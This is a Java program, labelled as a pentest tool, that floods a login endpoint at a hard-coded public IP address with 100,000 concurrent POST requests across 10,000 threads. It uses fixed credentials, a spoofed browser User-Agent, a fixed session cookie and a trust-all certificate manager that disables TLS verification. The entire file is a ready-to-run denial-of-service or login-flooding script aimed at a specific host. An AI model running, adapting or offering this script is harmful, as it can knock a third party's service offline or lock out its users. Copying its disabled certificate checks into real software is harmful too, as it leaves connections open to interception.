import javax.net.ssl.*;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class PentestPOST {
    private static final int TOTAL_REQUESTS = 100000; // Total requests
    private static final int THREADS = 10000; // Threads to use
    private static final String TARGET_URL = "http://41.231.37.150:8088/enginemanager/ftu/j_spring_security_check";
    private static final String POST_DATA = "j_username=hatX&j_password=hatX&host=http%3A%2F%2Flocalhost%3A8087&authType=basicAuth";

    public static void main(String[] args) throws Exception {
        // Disable SSL verification (Fake cert)
        SSLContext sslContext = SSLContext.getInstance("TLS");
        TrustManager[] trustAllCertificates = new TrustManager[]{new X509TrustManager() {
            public X509Certificate[] getAcceptedIssuers() { return null; }
            public void checkClientTrusted(X509Certificate[] certs, String authType) { }
            public void checkServerTrusted(X509Certificate[] certs, String authType) { }
        }};
        sslContext.init(null, trustAllCertificates, new SecureRandom());

        // Create HTTP client that ignores SSL verification
        HttpClient client = HttpClient.newBuilder()
            .sslContext(sslContext)
            .executor(Executors.newFixedThreadPool(THREADS))
            .build();

        // Thread pool for concurrent execution
        ExecutorService executor = Executors.newFixedThreadPool(THREADS);

        for (int i = 0; i < TOTAL_REQUESTS; i++) {
            executor.execute(() -> {
                try {
                    HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(TARGET_URL))
                        .header("Content-Type", "application/x-www-form-urlencoded")
                        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36")
                        .header("Cookie", "JSESSIONID=D411DFA2E9D207CD8290456FBC830340")
                        .POST(HttpRequest.BodyPublishers.ofString(POST_DATA))
                        .build();

                    HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                    System.out.println("Response: " + response.statusCode());
                } catch (Exception e) {
                    System.err.println("Request failed: " + e.getMessage());
                }
            });
        }

        executor.shutdown();
        executor.awaitTermination(10, TimeUnit.MINUTES);
    }
}
